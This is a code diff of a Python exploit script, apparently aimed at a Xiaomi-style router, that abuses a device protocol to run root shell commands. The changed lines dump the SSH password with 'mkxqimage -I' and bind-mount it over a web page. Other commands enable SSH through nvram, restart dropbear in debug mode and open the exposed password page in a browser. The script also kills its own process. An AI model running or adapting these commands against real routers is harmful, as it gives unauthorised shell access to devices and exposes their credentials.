@@ -4,6 +4,8 @@ import random
 import socket
 import logging
 import struct
+import os
+import sys
 from threading import Thread, Lock
 from urllib.request import urlopen
 import time
@@ -14,7 +16,7 @@ MaxDataLen = 1024
 GlobalFlag = 0x3F721FB5
 GlobalMac = "123456789ABC"
 
-logging.basicConfig(level=logging.debug)
+logging.basicConfig(level=logging.ERROR)
 
 class ElinkHead:
     def __init__(self, flag=0, length=0):
@@ -244,15 +246,22 @@ def main():
             print(session.devInfo)
             input("Press any key to continue...")
 
-            execute(session, r"mkxqimage -I > /www/password.txt")
+            execute(session, r"mkxqimage -I > /tmp/password.txt  & mount --bind /tmp/password.txt /www/init.html")
             execute(session, r"nvram set ssh_en=1 && nvram commit")
             execute(session, r"""sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear && /etc/init.d/dropbear start """)
-            pwurl = urlopen("http://"+addr+"/password.txt")
-            print("ssh password is "+pwurl.read()[2:10])
-            execute(session, r"rm -f /www/password.txt")
+            os.system("start http://192.168.31.1/init.html")
+            print("ssh password is already showed on browser, or access http://(router_ip)/init.html")
+            input("Press any key to continue...")
+            execute(session, r"umount /www/init.html")
 
             print("finish")
+            pid = os.getpid()
+            command = f"taskkill /pid {pid} /f"
+            os.system(command)
 
 
 if __name__ == '__main__':
+    if(os.name != "nt" ):
+        print("Only support Windows")
+        sys.exit(1)
     main()
